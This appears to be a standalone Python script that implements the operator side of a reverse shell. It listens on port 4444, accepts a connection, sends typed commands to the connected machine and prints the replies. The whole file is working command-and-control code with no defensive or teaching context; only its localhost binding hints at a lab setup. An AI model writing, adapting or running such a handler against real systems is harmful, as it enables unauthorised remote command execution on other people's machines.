import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", 4444))
print("Listening on port 4444")
s.listen(1)

target, ip = s.accept()
print("Connection received from: ", ip)

try:
    while True:
        command = input(f">>> {ip}: ")
        if command.strip().lower() == "exit":
            target.send(command.encode())
            print("Exiting...")
            break
        target.send(command.encode())
        res = target.recv(1024)
        print("Client:", res.decode())
finally:
    target.close()
    s.close()
